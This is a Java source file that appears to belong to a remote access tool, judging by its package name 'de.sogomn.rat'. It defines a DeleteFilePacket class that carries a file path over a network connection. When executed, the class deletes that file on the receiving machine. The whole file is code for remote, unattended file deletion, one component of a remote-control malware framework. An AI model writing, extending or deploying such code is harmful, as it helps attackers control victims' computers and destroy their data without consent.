package de.sogomn.rat.packet;

import java.io.File;

import de.sogomn.rat.ActiveConnection;

public final class DeleteFilePacket implements IPacket {
	
	private String path;
	
	public DeleteFilePacket(final String path) {
		this.path = path;
	}
	
	public DeleteFilePacket() {
		this("");
	}
	
	@Override
	public void send(final ActiveConnection client) {
		client.writeUTF(path);
	}
	
	@Override
	public void receive(final ActiveConnection client) {
		path = client.readUTF();
	}
	
	@Override
	public void execute(final ActiveConnection client) {
		final File file = new File(path);
		
		file.delete();
	}
	
}
